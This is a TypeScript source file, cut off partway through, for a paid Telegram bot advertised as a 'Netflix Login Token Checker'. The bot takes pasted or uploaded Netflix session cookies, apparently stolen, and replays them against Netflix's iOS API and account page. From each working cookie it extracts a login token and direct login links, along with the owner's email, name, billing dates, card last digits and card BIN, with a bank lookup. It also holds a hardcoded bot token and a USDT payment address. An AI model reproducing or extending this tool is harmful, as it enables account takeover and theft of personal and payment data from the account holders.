// @ts-nocheck
import TelegramBot from "node-telegram-bot-api";
import AdmZip from "adm-zip";
import { Storage } from "./storage";

const BOT_TOKEN = process.env.BOT_TOKEN || "8742801785:AAGXMZeugnbuZL3QDG6lbQXB3gP1jAJSJMw";
const OWNER_ID = process.env.OWNER_ID || "1366712263";
const USDT_ADDRESS = process.env.USDT_ADDRESS || "0x7c510f76649c305555484106c22ce3008352d0df";

const CHANNELS = [
  { url: "https://t.me/ThunderVault8", id: "@ThunderVault8" },
  { url: "https://t.me/netflixhivea", id: "@netflixhivea" },
  { url: "https://t.me/allichetools", id: "@allichetools" },
  { url: "https://t.me/+9njmxL1yJuA4YjE6", id: "" },
  { url: "https://t.me/+zBedda3BFAphZjIx", id: "" },
];

function esc(s: any): string {
  if (s === null || s === undefined) return "";
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function buildProfileText(u: any, storage: any, userId: string, roleLabel: string): string {
  const role = roleLabel;
  const hits = u.totalHits || 0;
  const dead = u.totalDead || 0;
  const checks = u.totalChecks || 0;
  const hitRate = checks > 0 ? ((hits / checks) * 100).toFixed(1) : "0.0";
  const deadRate = checks > 0 ? ((dead / checks) * 100).toFixed(1) : "0.0";
  const daysSinceJoin = Math.floor((Date.now() - new Date(u.joinedAt).getTime()) / (1000 * 60 * 60 * 24));
  const avgPerDay = daysSinceJoin > 0 ? (checks / daysSinceJoin).toFixed(1) : checks;

  let text = `👤 <b>Your Profile</b>\n${"─".repeat(30)}\n\n`;
  text += `🆔 <b>ID:</b> <code>${u.telegramId}</code>\n`;
  text += `👤 <b>Name:</b> ${esc(u.firstName)}\n`;
  if (u.username) text += `📛 <b>Username:</b> @${esc(u.username)}\n`;
  text += `📅 <b>Joined:</b> ${new Date(u.joinedAt).toLocaleDateString()} (${daysSinceJoin}d ago)\n`;
  text += `${role}\n`;
  if (storage.isEliteActive(userId) && u.expiry) {
    const daysLeft = Math.max(0, Math.ceil((u.expiry - Date.now()) / (1000 * 60 * 60 * 24)));
    text += `⏳ <b>Expires:</b> ${new Date(u.expiry).toLocaleDateString()} (${daysLeft}d left)\n`;
  }
  text += `\n📊 <b>Check Stats:</b>\n`;
  text += `🔍 <b>Total Checks:</b> ${checks}\n`;
  text += `✅ <b>Hits:</b> ${hits} (${hitRate}% hit rate)\n`;
  text += `❌ <b>Dead:</b> ${dead} (${deadRate}% dead rate)\n`;
  text += `📈 <b>Avg/Day:</b> ${avgPerDay} checks\n`;
  text += `\n💰 <b>Account:</b>\n`;
  text += `🎟️ <b>Tokens:</b> ${u.tokens}\n`;
  text += `👥 <b>Referrals:</b> ${u.referralCount || 0}\n`;
  if (u.referredBy) text += `🔗 <b>Referred by:</b> <code>${u.referredBy}</code>\n`;
  return text;
}

export function setupBot() {
  const bot = new TelegramBot(BOT_TOKEN, { polling: true });
  const storage = new Storage();
  const pending: Record<number, { action: string }> = {};
  const cancelled = new Set<number>();
  const autocheckCookies: Record<string, string> = {};
  let botUsername = "";

  console.log("🔑 NF Token Bot initializing...");

  bot.getMe().then(me => {
    botUsername = me.username || "";
    console.log(`✅ NF Token Bot running: @${me.username}`);
    bot.setMyCommands([
      { command: "start",   description: "🏠 Main menu" },
      { command: "profile", description: "👤 View your profile & stats" },
      { command: "ck",      description: "🔑 Token check (fast) — paste cookie" },
      { command: "ck2",     description: "🔴 Full check — paste cookie" },
      { command: "plan",    description: "💎 View Elite plan & pricing" },
      { command: "paid",    description: "💳 Notify payment sent" },
      { command: "ref",     description: "🔗 Your referral link" },
      { command: "tokens",  description: "🎟️ Check token balance" },
      { command: "help",    description: "📚 All commands & guide" },
      { command: "ping",    description: "🏓 Check bot latency" },
      { command: "cancel",  description: "⛔ Cancel current check" },
    ]).catch(() => {});
  });

  const uncheckableChannels = new Set<string>();

  async function checkChannelMembership(userId: number, chatId: string): Promise<boolean> {
    try {
      const member = await bot.getChatMember(chatId, userId);
      return ["member", "administrator", "creator"].includes(member.status);
    } catch (err: any) {
      const msg = err?.message || "";
      if (msg.includes("chat not found") || msg.includes("bot is not a member") || msg.includes("Bad Request")) {
        uncheckableChannels.add(chatId);
        return true;
      }
      if (msg.includes("user not found") || msg.includes("USER_NOT_PARTICIPANT")) {
        return false;
      }
      return true;
    }
  }

  async function checkAllChannels(userId: number): Promise<boolean> {
    for (const ch of CHANNELS) {
      if (!ch.id || ch.url.includes("/+")) continue;
      if (uncheckableChannels.has(ch.id)) continue;
      const ok = await checkChannelMembership(userId, ch.id);
      if (!ok) return false;
    }
    return true;
  }

  function joinChannelsKeyboard(): TelegramBot.InlineKeyboardButton[][] {
    const rows: TelegramBot.InlineKeyboardButton[][] = [];
    CHANNELS.forEach((ch, i) => {
      rows.push([{ text: `📢 Channel ${i + 1}`, url: ch.url }]);
    });
    rows.push([{ text: "✅ I Joined All", callback_data: "check_joined" }]);
    return rows;
  }

  async function sendJoinMessage(chatId: number) {
    await bot.sendMessage(chatId,
      `⚠️ <b>You must join all channels first!</b>\n\nJoin the channels below, then click "I Joined All":`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: joinChannelsKeyboard() } }
    );
  }

  function isOwner(userId: number): boolean {
    return String(userId) === OWNER_ID;
  }

  function getRoleLabel(telegramId: string): string {
    if (telegramId === OWNER_ID) return "👑 Owner";
    const u = storage.getUser(telegramId);
    if (!u) return "🆓 Free";
    if (storage.isEliteActive(telegramId)) return "⭐ Elite Member";
    return "🆓 Free";
  }

  function mainMenu(): TelegramBot.InlineKeyboardButton[][] {
    return [
      [{ text: "🔑 NF Token Checker", callback_data: "nf_token" }, { text: "🔴 Full Check", callback_data: "nf_checker" }],
      [{ text: "👤 My Profile", callback_data: "profile" }, { text: "💎 Subscribe", callback_data: "plan" }],
      [{ text: "🔗 Referral Link", callback_data: "referral" }, { text: "🎟️ My Tokens", callback_data: "tokens" }],
      [{ text: "📚 Help & Commands", callback_data: "help" }],
    ];
  }

  function getQualityBadge(plan: string, country: string): string {
    const p = (plan || "").toLowerCase();
    const premiumCountries = ["US", "GB", "DE", "FR", "CA", "AU", "JP", "KR", "NL", "SE", "NO", "DK"];
    const isPremiumCountry = premiumCountries.includes(country || "");
    if (p.includes("premium") || p.includes("ultra") || p.includes("4k")) {
      return isPremiumCountry ? "🥇 Premium+" : "🥇 Premium";
    }
    if (p.includes("standard")) return "🥈 Standard";
    if (p.includes("basic") || p.includes("mobile")) return "🥉 Basic";
    return "🎯 Active";
  }

  function adminMenu(): TelegramBot.InlineKeyboardButton[][] {
    const config = storage.getConfig();
    const nfStatus = config.netflixLocked ? "🔒" : "🔓";
    return [
      [{ text: "📊 Bot Stats", callback_data: "admin_stats" }],
      [{ text: "⭐ Elite Members", callback_data: "admin_elite" }],
      [{ text: "📋 Pending Payments", callback_data: "admin_pending" }],
      [{ text: `${nfStatus} Netflix: ${config.netflixLocked ? "Locked" : "Open"}`, callback_data: config.netflixLocked ? "admin_unlock_nf" : "admin_lock_nf" }],
      [{ text: "📢 Broadcast", callback_data: "admin_broadcast" }],
      [{ text: "🚫 Ban User", callback_data: "admin_ban_prompt" }, { text: "✅ Unban User", callback_data: "admin_unban_prompt" }],
      [{ text: "🚫 Banned Users", callback_data: "admin_banned" }],
      [{ text: "👥 All Users", callback_data: "admin_users" }],
      [{ text: "🔙 Main Menu", callback_data: "main_menu" }],
    ];
  }

  function noAccessMessage(): string {
    return `🔒 <b>Access Denied</b>\n${"─".repeat(25)}\n\nYou need an active subscription or tokens to use this feature.\n\n💎 <b>Elite Plan:</b> $5/month\n🎟️ <b>Tokens:</b> Refer friends to earn free tokens\n\n👉 Use /plan to see subscription details\n👉 Use /ref to get your referral link`;
  }

  const COUNTRY_NAMES: Record<string, string> = {
    TR: "Turkey", US: "United States", GB: "United Kingdom", DE: "Germany", FR: "France",
    BR: "Brazil", IN: "India", JP: "Japan", KR: "South Korea", CA: "Canada", AU: "Australia",
    IT: "Italy", ES: "Spain", MX: "Mexico", AR: "Argentina", CL: "Chile", CO: "Colombia",
    SA: "Saudi Arabia", AE: "UAE", EG: "Egypt", PH: "Philippines", TH: "Thailand", ID: "Indonesia",
    MY: "Malaysia", SG: "Singapore", PK: "Pakistan", BD: "Bangladesh", NL: "Netherlands",
    BE: "Belgium", SE: "Sweden", NO: "Norway", DK: "Denmark", FI: "Finland", PL: "Poland",
    PT: "Portugal", GR: "Greece", RO: "Romania", HU: "Hungary", CZ: "Czech Republic",
    IL: "Israel", ZA: "South Africa", NG: "Nigeria", KE: "Kenya", TW: "Taiwan", HK: "Hong Kong",
  };

  function getCountryFlag(code: string): string {
    if (!code || code.length !== 2) return "🌍";
    try {
      return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
    } catch { return "🌍"; }
  }



  function cleanCookie(raw: string): string {
    let c = raw.trim();
    if (c.startsWith("NetflixId=")) c = c.substring("NetflixId=".length);
    if (c.startsWith("netflixid=")) c = c.substring("netflixid=".length);
    const semicolonIdx = c.indexOf(";");
    if (semicolonIdx !== -1) c = c.substring(0, semicolonIdx);
    return c.trim();
  }

  function parseCookiesFromText(text: string): string[] {
    const lines = text.split(/[\n\r]+/);
    const cookies: string[] = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.length < 10) continue;
      if (trimmed.startsWith("#") || trimmed.startsWith("//")) continue;
      const parts = trimmed.split(/[,\t|]+/);
      for (const part of parts) {
        const cleaned = cleanCookie(part);
        if (cleaned.length >= 10) {
          cookies.push(cleaned);
        }
      }
    }
    return cookies;
  }

  interface BinInfo {
    brand?: string;
    type?: string;
    level?: string;
    bank?: string;
    country?: string;
    countryFlag?: string;
  }

  async function lookupBin(cardLast4: string, fullBin?: string): Promise<BinInfo | null> {
    if (!fullBin || fullBin.length < 6) return null;
    const bin = fullBin.replace(/\D/g, "").substring(0, 6);
    if (bin.length < 6) return null;
    try {
      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
        headers: { "Accept-Version": "3" },
        signal: AbortSignal.timeout(5000),
      });
      if (res.status !== 200) return null;
      const data: any = await res.json();
      return {
        brand: data.scheme || undefined,
        type: data.type || undefined,
        level: data.brand || undefined,
        bank: data.bank?.name || undefined,
        country: data.country?.alpha2 || undefined,
        countryFlag: data.country?.emoji || undefined,
      };
    } catch { return null; }
  }

  interface NFCheckResult {
    success: boolean;
    token?: string;
    loginUrl?: string;
    expires?: string;
    country?: string;
    countryName?: string;
    plan?: string;
    price?: string;
    email?: string;
    name?: string;
    memberSince?: string;
    nextBilling?: string;
    payment?: string;
    cardInfo?: string;
    cardBin?: string;
    binInfo?: BinInfo;
    phone?: string;
    quality?: string;
    streams?: string;
    profiles?: string[];
    profileCount?: number;
    membershipStatus?: string;
    error?: string;
    cookie?: string;
  }

  async function checkNetflixCookie(netflixId: string): Promise<NFCheckResult> {
    try {
      const url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
      const params = new URLSearchParams({
        appVersion: "15.48.1",
        config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        device_type: "NFAPPL-02-",
        esn: "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        idiom: "phone",
        iosVersion: "15.8.5",
        isTablet: "false",
        languages: "en-US",
        locale: "en-US",
        maxDeviceWidth: "375",
        model: "saget",
        modelType: "IPHONE8-1",
        odpAware: "true",
        path: '["account","token","default"]',
        pathFormat: "graph",
        pixelDensity: "2.0",
        progressive: "false",
        responseFormat: "json",
      });

      const headers: Record<string, string> = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.client.idiom": "phone",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": `NetflixId=${netflixId}`,
      };

      const res = await fetch(`${url}?${params.toString()}`, { headers, signal: AbortSignal.timeout(30000) });
      const rawText = await res.text();

      if (res.status !== 200) return { success: false, error: `HTTP ${res.status}` };

      let data: any;
      try { data = JSON.parse(rawText); } catch { return { success: false, error: "JSON parse failed" }; }

      const account = data?.value?.account;
      if (!account) return { success: false, error: "Invalid response / expired cookie" };

      const tokenInfo = account?.token?.default;
      if (!tokenInfo?.token) return { success: false, error: "No token in response" };

      const tokenValue = tokenInfo.token;
      const expiresMs = tokenInfo.expires;
      const expiresDate = new Date(expiresMs).toISOString();
      const loginUrl = `https://netflix.com/account?nftoken=${tokenValue}`;

      const result: NFCheckResult = {
        success: true,
        token: tokenValue,
        loginUrl,
        expires: expiresDate,
        country: "Unknown",
        countryName: "Unknown",
        plan: "Unknown",
        email: "",
        name: "",
        cookie: netflixId,
      };

      try {
        const deep = (obj: any, ...keys: string[]) => {
          let v = obj;
          for (const k of keys) { v = v?.[k]; if (v === undefined) return undefined; }
          return v;
        };
        result.email = account.email || account.emailAddress || deep(account, "userInfo", "email") || "";
        result.name = account.firstName || deep(account, "userInfo", "firstName") || "";
        const ms = account.membershipStatus || {};
        result.country = ms.countryOfSignup || ms.currentCountry || account.countryOfSignup || deep(account, "userInfo", "countryOfSignup") || "Unknown";
        result.countryName = COUNTRY_NAMES[result.country] || result.country;
        result.plan = ms.currentPlanName || ms.planName || deep(account, "planDetails", "planName") || "Unknown";
      } catch {}

      try {
        const acctRes = await fetch("https://www.netflix.com/YourAccount", {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Cookie": `NetflixId=${netflixId}`,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
          },
          redirect: "follow",
          signal: AbortSignal.timeout(15000),
        });
        const html = await acctRes.text();
        const reactMatch = html.match(/netflix\.reactContext\s*=\s*({.+?});\s*<\/script>/s);
        if (reactMatch) {
          const ctx = JSON.parse(reactMatch[1].replace(/\\x([0-9a-fA-F]{2})/g, (_: any, hex: string) => String.fromCharCode(parseInt(hex, 16))));
          const findInObj = (obj: any, key: string, depth = 0): any => {
            if (!obj || typeof obj !== "object" || depth > 8) return undefined;
            if (obj[key] !== undefined) return obj[key];
            for (const k of Object.keys(obj)) {
              const r = findInObj(obj[k], key, depth + 1);
              if (r !== undefined) return r;
            }
            return undefined;
          };

          if (!result.email) result.email = findInObj(ctx, "memberEmail") || findInObj(ctx, "email") || "";
          if (!result.name) result.name = findInObj(ctx, "firstName") || "";

          const country = findInObj(ctx, "countryOfSignup") || findInObj(ctx, "currentCountry") || "";
          if (country && result.country === "Unknown") {
            result.country = country;
            result.countryName = COUNTRY_NAMES[country] || country;
          }

          const plan = findInObj(ctx, "currentPlanName") || findInObj(ctx, "planName") || "";
          if (plan && result.plan === "Unknown") result.plan = plan;

          const price = findInObj(ctx, "currentPlanPrice") || findInObj(ctx, "planPrice");
          if (price) {
            const curr = findInObj(ctx, "planCurrency") || findInObj(ctx, "currencyCode") || "";
            result.price = curr ? `${price} ${curr}` : String(price);
          }

          const memberSince = findInObj(ctx, "memberSince") || findInObj(ctx, "startDate");
          if (memberSince) {
            const d = new Date(memberSince);
            if (!isNaN(d.getTime())) result.memberSince = d.toLocaleDateString("en-US", { month: "long", year: "numeric" });
          }

          const nextBill = findInObj(ctx, "nextBillingDate") || findInObj(ctx, "nextPaymentDate");
          if (nextBill) {
            const d = new Date(nextBill);
            if (!isNaN(d.getTime())) result.nextBilling = d.toLocaleDateString("en-US", { day: "numeric", month: "short", year: "numeric" });
          }

          const payType = findInObj(ctx, "currentPaymentType") || findInObj(ctx, "paymentType");
          if (payType) result.payment = payType;

          const card = findInObj(ctx, "lastFourDigits") || findInObj(ctx, "cardLastFourDigits");
          if (card) result.cardInfo = `****${card}`;

          const cardBin = findInObj(ctx, "bin") || findInObj(ctx, "cardBin") || findInObj(ctx, "firstSixDigits");
          if (cardBin) result.cardBin = String(cardBin);

          result.membershipStatus = findInObj(ctx, "membershipStatus") || findInObj(ctx, "userStatus");
          result.quality = findInObj(ctx, "videoQuality") || findInObj(ctx, "hdAvailable") ? "HD/UHD" : "";

          const profiles = findInObj(ctx, "profiles");
          if (profiles && typeof profiles === "object") {
            const pList: string[] = [];
            const arr = Array.isArray(profiles) ? profiles : Object.values(profiles);
            for (const p of arr) {
              if (p?.firstName) pList.push(p.firstName);
              else if (p?.profileName) pList.push(p.profileName);
            }
            if (pList.length > 0) {
              result.profiles = pList;
              result.profileCount = pList.length;
            }
          }
        }
      } catch {}

      if (result.cardBin) {
        try {
          result.binInfo = await lookupBin(result.cardInfo || "", result.cardBin) || undefined;
        } catch {}
      }

      return result;
    } catch (err: any) {
      return { success: false, error: err.message || "Unknown error" };
    }
  }

  function formatNFHit(h: NFCheckResult, idx: number): string {
    const flag = getCountryFlag(h.country || "");
    const badge = getQualityBadge(h.plan || "", h.country || "");
    let msg = `✅ <b>Hit #${idx}</b> ${badge}\n${"─".repeat(25)}\n`;
    msg += `${flag} <b>Country:</b> ${esc(h.countryName || h.country || "Unknown")}\n`;
    msg += `📦 <b>Plan:</b> ${esc(h.plan || "Unknown")}\n`;
    if (h.price) msg += `💰 <b>Price:</b> ${esc(h.price)}\n`;
    if (h.email) msg += `📧 <b>Email:</b> <code>${esc(h.email)}</code>\n`;
    if (h.name) msg += `👤 <b>Name:</b> ${esc(h.name)}\n`;
    if (h.memberSince) msg += `📅 <b>Member Since:</b> ${esc(h.memberSince)}\n`;
    if (h.nextBilling) msg += `💳 <b>Next Billing:</b> ${esc(h.nextBilling)}\n`;
    if (h.payment) msg += `💳 <b>Payment:</b> ${esc(h.payment)}\n`;
    if (h.cardInfo) msg += `💳 <b>Card:</b> ${esc(h.cardInfo)}\n`;
    if (h.binInfo) {
      let binStr = "";
      if (h.binInfo.brand) binStr += `${h.binInfo.brand} `;
      if (h.binInfo.type) binStr += `${h.binInfo.type} `;
      if (h.binInfo.level) binStr += `${h.binInfo.level} `;
      if (h.binInfo.bank) binStr += `| ${h.binInfo.bank} `;
      if (h.binInfo.country) binStr += `${h.binInfo.countryFlag || ""} ${h.binInfo.country}`;
      if (binStr.trim()) msg += `🏦 <b>BIN:</b> ${esc(binStr.trim())}\n`;
    }
    if (h.profiles && h.profiles.length > 0) msg += `👥 <b>Profiles (${h.profileCount}):</b> ${h.profiles.map(esc).join(", ")}\n`;
    if (h.token) msg += `\n🔑 <b>Token:</b> <code>${esc(h.token)}</code>\n`;
    if (h.token) msg += `📱 <b>Mobile:</b> <a href="https://netflix.com/unsupported?nftoken=${esc(h.token)}">Login (Mobile)</a>\n`;
    if (h.token) msg += `💻 <b>PC:</b> <a href="https://netflix.com/account?nftoken=${esc(h.token)}">Login (PC)</a>\n`;
    msg += `\n<i>Checked by @ghost5698</i>`;
    return msg;
  }

  function formatNFHitPlain(h: NFCheckResult, idx: number): string {
    let line = `═══ Hit #${idx} ═══\n`;
    line += `Country: ${h.countryName || h.country || "Unknown"}\n`;
    line += `Plan: ${h.plan || "Unknown"}\n`;
    if (h.price) line += `Price: ${h.price}\n`;
    if (h.email) line += `Email: ${h.email}\n`;
    if (h.name) line += `Name: ${h.name}\n`;
    if (h.memberSince) line += `Member Since: ${h.memberSince}\n`;
    if (h.nextBilling) line += `Next Billing: ${h.nextBilling}\n`;
    if (h.payment) line += `Payment: ${h.payment}\n`;
    if (h.cardInfo) line += `Card: ${h.cardInfo}\n`;
    if (h.binInfo) {
      let binStr = "";
      if (h.binInfo.brand) binStr += `${h.binInfo.brand} `;
      if (h.binInfo.type) binStr += `${h.binInfo.type} `;
      if (h.binInfo.level) binStr += `${h.binInfo.level} `;
      if (h.binInfo.bank) binStr += `| ${h.binInfo.bank} `;
      if (h.binInfo.country) binStr += `${h.binInfo.country}`;
      if (binStr.trim()) line += `BIN: ${binStr.trim()}\n`;
    }
    if (h.profiles && h.profiles.length > 0) line += `Profiles (${h.profileCount}): ${h.profiles.join(", ")}\n`;
    if (h.token) line += `Token: ${h.token}\n`;
    if (h.token) line += `Mobile: https://netflix.com/unsupported?nftoken=${h.token}\n`;
    if (h.token) line += `PC: https://netflix.com/account?nftoken=${h.token}\n`;
    return line;
  }

  async function extractFileText(msg: TelegramBot.Message): Promise<string | null> {
    if (!msg.document) return null;
    const doc = msg.document;
    const fname = (doc.file_name || "").toLowerCase();
    try {
      const fileLink = await bot.getFileLink(doc.file_id);
      const fileRes = await fetch(fileLink);
      if (fname.endsWith(".zip")) {
        const arrayBuf = await fileRes.arrayBuffer();
        const zip = new AdmZip(Buffer.from(arrayBuf));
        const entries = zip.getEntries();
        const allFiles = entries.filter(e => !e.isDirectory);
        let text = "";
        for (const entry of allFiles) {
          const content = entry.getData().toString("utf8");
          if (content.length > 10) text += content + "\n";
        }
        await bot.sendMessage(msg.chat.id, `📦 ZIP: extracted ${allFiles.length} file(s)`, { parse_mode: "HTML" });
        return text;
      } else {
        return await fileRes.text();
      }
    } catch (err: any) {
      await bot.sendMessage(msg.chat.id, `❌ Error reading file: ${err.message}`);
      return null;
    }
  }

  bot.onText(/\/start(.*)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const username = msg.from?.username || "";
    const firstName = msg.from?.first_name || "";
    const startParam = (match?.[1] || "").trim();

    let referredBy: string | undefined;
    if (startParam.startsWith(" ref_") || startParam.startsWith("ref_")) {
      const refId = startParam.replace(/^\s*ref_/, "");
      if (refId && refId !== String(userId)) {
        const existing = storage.getUser(String(userId));
        if (!existing) {
          referredBy = refId;
        }
      }
    }

    const isNew = !storage.getUser(String(userId));
    storage.getOrCreateUser(String(userId), username, firstName, referredBy);

    if (isNew && referredBy) {
      const refUser = storage.getUser(referredBy);
      if (refUser) {
        try {
          await bot.sendMessage(Number(referredBy),
            `🎉 <b>New Referral!</b>\n\n${esc(firstName)} joined using your link!\n🎁 You earned <b>+3 tokens</b>!`,
            { parse_mode: "HTML" }
          );
        } catch {}
      }
    }

    if (CHANNELS.length > 0 && !await checkAllChannels(userId)) {
      return sendJoinMessage(chatId);
    }

    const u = storage.getUser(String(userId))!;
    const role = getRoleLabel(String(userId));
    let profileText = `🔑 <b>Netflix Login Token Checker</b>\n${"─".repeat(30)}\n\n`;
    profileText += `👤 <b>${esc(firstName)}</b>\n`;
    profileText += `🆔 <code>${userId}</code>\n`;
    profileText += `${role}\n`;
    if (storage.isEliteActive(String(userId)) && u.expiry) {
      profileText += `⏳ Expires: ${new Date(u.expiry).toLocaleDateString()}\n`;
    }
    profileText += `🎟️ Tokens: ${u.tokens}\n`;
    profileText += `\nChoose an option below:`;

    await bot.sendMessage(chatId, profileText, {
      parse_mode: "HTML", reply_markup: { inline_keyboard: mainMenu() }
    });
  });

  bot.onText(/\/plan/, async (msg) => {
    const chatId = msg.chat.id;
    let text = `💎 <b>Elite Subscription Plan</b>\n${"─".repeat(30)}\n\n`;
    text += `💰 <b>Price:</b> $5 / month\n`;
    text += `💳 <b>Payment:</b> USDT (BEP20 / Binance)\n\n`;
    text += `📋 <b>USDT Address:</b>\n<code>${USDT_ADDRESS}</code>\n\n`;
    text += `⭐ <b>Elite Benefits:</b>\n`;
    text += `• ♾️ Unlimited Netflix checks\n`;
    text += `• 🔑 Token extraction\n`;
    text += `• 🔴 Full account details\n`;
    text += `• 📊 BIN lookup\n`;
    text += `• ⚡ Priority support\n\n`;
    text += `📩 After payment, send /paid\n`;
    text += `✅ Owner will verify and grant access\n\n`;
    text += `📞 Contact: @ghost5698`;
    await bot.sendMessage(chatId, text, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "💵 I've Paid", callback_data: "mark_paid" }], [{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
    });
  });

  bot.onText(/\/paid/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const username = msg.from?.username || "";
    const firstName = msg.from?.first_name || "";
    storage.getOrCreateUser(String(userId), username, firstName);
    storage.setPending(String(userId));

    await bot.sendMessage(chatId,
      `✅ <b>Payment Marked!</b>\n\nYour payment request has been sent to the owner.\nPlease wait for verification.\n\n📞 Contact @ghost5698 if needed.`,
      { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] } }
    );

    try {
      await bot.sendMessage(Number(OWNER_ID),
        `💰 <b>New Payment Notification!</b>\n${"─".repeat(25)}\n\n👤 <b>User:</b> ${esc(firstName)} (@${esc(username || "N/A")})\n🆔 <b>ID:</b> <code>${userId}</code>\n\nUse /grant ${userId} to approve.`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: `✅ Grant Elite`, callback_data: `grant_${userId}` }, { text: `❌ Reject`, callback_data: `reject_${userId}` }]] } }
      );
    } catch {}
  });

  bot.onText(/\/ref/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const u = storage.getUser(String(userId));
    const refLink = `https://t.me/${botUsername}?start=ref_${userId}`;
    let text = `🔗 <b>Your Referral Link</b>\n${"─".repeat(30)}\n\n`;
    text += `<code>${refLink}</code>\n\n`;
    text += `👥 <b>Total Referrals:</b> ${u?.referralCount || 0}\n`;
    text += `🎟️ <b>Tokens earned:</b> ${u?.tokens || 0}\n\n`;
    text += `🎁 Each referral = <b>+3 tokens</b>\n`;
    text += `🎟️ 1 token = 1 free check\n`;
    text += `📊 Max free tokens: 3\n\n`;
    text += `Share your link to earn free checks!`;
    await bot.sendMessage(chatId, text, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Main Menu", callback_data: "main_menu" }]] }
    });
  });

  bot.onText(/\/tokens/, async (msg) => {
    const userId = msg.from!.id;
    const tokens = storage.getTokens(String(userId));
    await bot.sendMessage(msg.chat.id,
      `🎟️ <b>Your Tokens:</b> ${tokens}\n\n1 token = 1 free check\nEarn tokens by referring friends!\nUse /ref to get your referral link.`,
      { parse_mode: "HTML" }
    );
  });

  bot.onText(/\/ck(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from!.id;
    const username = msg.from?.username || "";
    const firstName = msg.from?.first_name || "";
    storage.getOrCreateUser(String(userId), username, firstName);

    if (storage.isBanned(String(userId))) return;

    const rawCookie = (match?.[1] || "").trim();
    if (!rawCookie) {
      return bot.sendMessage(chatId,
        `📖 <b>Usage:</b> <code>/ck NetflixIDValue</code>\n\nExample:\n<code>/ck eyJhbGciOiJSUzI1NiJ9...</code>`,
        { parse_mode: "HTML" }
      );
    }

    const access = storage.hasAccess(String(userId), OWNER_ID);
    if (!access.allowed) {
      return bot.sendMessage(chatId, noAccessMessage(), {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: [[{ text: "💎 Subscribe", callback_data: "plan" }]] }
      });
    }
    if (access.usedToken) {
      await bot.sendMessage(chatId, `🎟️ Used 1 token. Remaining: ${storage.getTokens(String(userId))}`);
    }

    const cookie = cleanCookie(rawCookie);
    const statusMsg = await bot.sendMessage(chatId, `🔑 Checking token...`, { parse_mode: "HTML" });
    const result = await checkNetflixCookie(cookie);
    storage.addDailyChecks(String(userId), 1);

    try { await bot.deleteMessage(chatId, statusMsg.message_id); } catch {}

    if (result.success && result.token) {
      storage.addHit(String(userId));
      const flag = getCountryFlag(result.country || "");
      const badge = getQualityBadge(result.plan || "", result.country || "");
      const emailLine = result.email ? `📧 <b>Email:</b> <code>${esc(result.email)}</code>\n` : "";
